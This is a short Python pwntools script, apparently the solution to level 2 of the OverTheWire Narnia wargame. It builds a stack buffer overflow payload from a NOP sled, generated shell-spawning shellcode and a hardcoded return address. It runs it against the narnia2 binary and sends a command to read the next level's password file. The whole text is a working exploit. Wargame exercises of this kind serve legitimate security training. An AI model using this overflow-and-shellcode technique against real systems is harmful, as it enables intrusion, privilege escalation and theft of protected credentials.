# must be run from the machine - over ssh mangles the payload somehow
from pwn import *

shellcode = asm(shellcraft.sh())
payload = flat(
    b'\x90'*(132 - len(shellcode)),
    shellcode,
    0xffffd850,
)

p = process([b'/narnia/narnia2', payload])
p.sendline(b'cat /etc/narnia_pass/narnia3')
print('\nnarnia3 pass: ' + p.recvline().decode())

